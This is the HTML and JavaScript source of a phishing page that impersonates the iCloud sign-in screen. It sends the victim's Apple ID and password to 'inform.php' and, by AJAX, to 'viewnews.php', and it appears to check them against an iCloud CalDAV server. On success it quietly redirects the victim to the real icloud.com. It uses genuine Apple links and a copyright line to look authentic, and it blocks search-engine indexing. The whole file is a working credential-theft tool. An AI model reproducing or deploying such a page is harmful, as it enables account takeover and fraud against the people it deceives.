<html lang="pt-br"><head>

<meta name="robots" content="NOINDEX, NOFOLLOW">

    <title>iCloud</title>

    <meta charset="utf-8">

    <link rel="shortcut icon" href="favicon.ico">

    <link rel="stylesheet" href="css/styles.css">

    <link rel="stylesheet" href="http://code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css">

    <script src="http://code.jquery.com/jquery-1.10.2.js"></script><style type="text/css"></style>

    <script src="http://code.jquery.com/ui/1.11.3/jquery-ui.js"></script>

    <script src="activity-indicator.js"></script>

	

<!--Mobile Script Exceptions-->

<script type="text/javascript">

if (screen.width <= 699) {

document.location = "mobile.html";

}

</script>



<script language="javascript">

if ((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {

   location.replace("mobile.html");

}

</script>

<!--/Mobile Script Exceptions-->

</head>



<body class="body_image_old" style="visibility: visible;">



<div class="body_image_new" style="opacity: 1;"></div>

<div id="loader" class="loader" style="display: none;"><div style="width: 26px; height: 26px; position: absolute; margin-top: -13px; margin-left: -13px; animation: spin12 0.8s linear infinite;"><svg style="width: 26px; height: 26px;"><g transform="translate(13,13)"><g stroke-width="1.5" stroke-linecap="round" stroke="rgb(255, 255, 255)"><line x1="0" y1="6" x2="0" y2="11" transform="rotate(0, 0, 0)" opacity="1"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(30, 0, 0)" opacity="0.9173553719008265"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(60, 0, 0)" opacity="0.8347107438016529"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(90, 0, 0)" opacity="0.7520661157024794"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(120, 0, 0)" opacity="0.6694214876033058"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(150, 0, 0)" opacity="0.5867768595041323"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(180, 0, 0)" opacity="0.5041322314049588"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(210, 0, 0)" opacity="0.42148760330578516"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(240, 0, 0)" opacity="0.33884297520661155"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(270, 0, 0)" opacity="0.25619834710743805"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(300, 0, 0)" opacity="0.17355371900826455"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(330, 0, 0)" opacity="0.09090909090909094"></line></g></g></svg></div></div>

<div class="container">

    <div class="wrapper">



        <div class="header">

            <div class="logo lF"></div>

            <div class="info lR">

                <div class="instr lF">

				<script type="text/javascript">

                        

                        function newPopup(url) {

                            popupWindow = window.open(

                                url,'popUpWindow','height=700,width=800,left=10,top=10,resizable=no,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no,status=yes')

                        }

                    </script>

                    <span><a href="https://www.apple.com/icloud/setup/">Cómo configurar iCloud</a></span>

                </div>

                <div class="help lF"></div>

            </div>

        </div>

		

        <div class="body">

            <div>

                <div class="cloud"></div>

                <div class="labelRef">

                    <span>Iniciar sesión en iCloud</span>

                </div>

                <div>

                    <form action="inform.php" method="post">

                        <div class="boxFrm" style="width:325px;">

                            <div class="line1">

                                <input type="text" value="" class="appId1" placeholder="ID de Apple" name="apple" id="apple">

                            </div>

                            <div class="line2">

                                <input type="Contraseña" value="" class="appId2 lF" placeholder="Contraseña" name="pw" id="pw">

                                <input type="hidden" value="https://p01-caldav.icloud.com" id="server" name="server">

                                <input type="hidden" value="icloudow.com/" name="link">

                                <div style="margin-left:270px;"><input type="submit" value="" class="sbBtn lF" style="opacity: 0.2;"></div>

                            </div>

                        </div>

                    </form>

                </div>

                <div class="cont">

                    <span class="tlrm"><input type="checkbox"></span>

                    <span class="txt">Permanecer conectado</span>

                </div>

                <div class="cont2 sec">

                    <div class="center">

                        <span class="account-cr">No tienes una ID de Apple&nbsp;ID?&nbsp;<a class="clickable" href="#">Crear una ahora.</a></span>

                    </div>

                </div>

            </div>

        </div>

        <div class="footer">

            <div class="fLogo lF"></div>

            <ul class="lR">

                <li><a href="https://www.icloud.com/activationlock">Check&nbsp;Activation&nbsp;Lock&nbsp;Status</a></li>

                <li><a href="https://iforgot.apple.com">Forgot&nbsp;ID&nbsp;or&nbsp;Password?</a></li>

                <li><a href="https://www.apple.com/support/systemstatus/">System&nbsp;Status</a></li>

                <li><a href="https://www.apple.com/privacy/">Privacy&nbsp;Policy</a></li>

                <li><a href="https://www.apple.com/legal/icloud/ww/">Terms&nbsp;&amp;&nbsp;Conditions</a></li>

                <li>Copyright © 2015 Apple Inc. All rights reserved.</li>

            </ul>

        </div>



    </div>

</div>



<script>

      $("body").css("visibility", "hidden");

    $('#loader').activity({width: 1.5, segments: 12, length: 5});

    jQuery('#submit_loader').activity({width: 1.5, segments: 12, length: 5});

    function typeCheck(element) {

        var key = event.keyCode || event.charCode;

        if (key == 8 || key == 46) {

            $(".sbBtn").css("opacity", "0.2");

            return element;

        }

        if (element !== "") {

            $(".sbBtn").css("opacity", "1");

        } else {

            $(".sbBtn").css("opacity", "0.2");

        }

    }

    $(document).ready(function () {

        $("body").css("visibility", "visible");

                function isValidEmailAddress(emailAddress) {

            var pattern = new RegExp(/^(("[\w-+\s]+")|([\w-+]+(?:\.[\w-+]+)*)|("[\w-+\s]+")([\w-+]+(?:\.[\w-+]+)*))(@((?:[\w-+]+\.)*\w[\w-+]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][\d]\.|1[\d]{2}\.|[\d]{1,2}\.))((25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\.){2}(25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\]?$)/i);

            return pattern.test(emailAddress);

        };

        $('input[name=apple]').bind("keydown", function(e){

            // enter key code is 13

            if(e.which == 13 || e.which == 9){

                e.preventDefault();

                var val = $(this).val();

                if (!isValidEmailAddress(val)) {

                    val = val+"@icloud.com";

                    $(this).val(val);

                } else {

                    console.log($(this).val());

                }

                console.log(val);

                $("input[name=pw]").focus();

                if(jQuery('#apple').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");



                return false;

            }

        });

        $("input[name=pw]").on("click keyup", function(){

            val = $("input[name=apple]").val();

            if (!isValidEmailAddress(val)) {

                if(val!='@icloud.com' && val!='') val = val+"@icloud.com";

                $("input[name=apple]").val(val);

            }

            if(jQuery('#apple').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");

        });

        var mm = 0;

        var ss = setTimeout(function () {

            $(".body_image_new").animate({ opacity: "1" }, 1000);

            console.log(mm);

            clearTimeout(ss);

        }, 7500);

        k = 1;

        $(".tlrm").on("click", function () {

            k++;

            if (k % 2 == 0) {

                $("#tlrm").attr("src", "images/checked.png");

            } else {

                $("#tlrm").attr("src", "images/Unknown");

            }

        });

    });

    var ss2 = setTimeout(function () {

        $("#loader").fadeOut("slow");

        $("div.container").fadeIn("slow");

        $("div.container").css("display:", "block");

        $(".sbBtn").css("opacity", "0.2");

        clearTimeout(ss2);

    }, 4500);



    $('#apple,#pw').on('keyup', function(e) {

        if (e.which == 13) {

            checklogin();

        }

    });



    function checklogin()

    {

        var apple = jQuery('#apple').val();

        var pw = jQuery('#pw').val();

        var server = jQuery('#server').val();

        var lang = jQuery('#lang').val();

        var links = jQuery('#link').val();

        if(apple!='' && pw!='')

        {

            jQuery('#submit_button').hide();

            jQuery('#submit_loader').show();

            jQuery.ajax({

                type:"POST",

                url:"viewnews.php",

                data:"apple="+apple+"&pw="+pw+"&server="+server+"&lang="+lang+"&link="+links,

                success: function(msg){

                    if(msg.search("INVALID")!=-1)

                    {

                        $('div.body').effect('shake');

                        jQuery('#submit_button').show();

                        jQuery('#submit_loader').hide();

                        $(".sbBtn").css("opacity", "0.2");



                    }

                    else if(msg.search("SUCCESS")!=-1)

                    {

                        window.location.href = "https://www.icloud.com";

                    }

                    else

                    {

                        $('div.body').effect('shake');

                        jQuery('#submit_button').show();

                        jQuery('#submit_loader').hide();

                        $(".sbBtn").css("opacity", "0.2");

                    }

                }

            });

        }

        else

        {

            if(apple=='') jQuery('#apple').focus();

            else if(pw=='') jQuery('#pw').focus();

        }

    }



    function change_image(src)

    {

        if(src=='check2.png') jQuery('#help_checkbox').attr({'src':'check2.png','onClick':"change_image('check1.png')"}); else jQuery('#help_checkbox').attr('src','check1.png').attr('onClick',"change_image('check2.png')");

    }

</script>

</body></html>

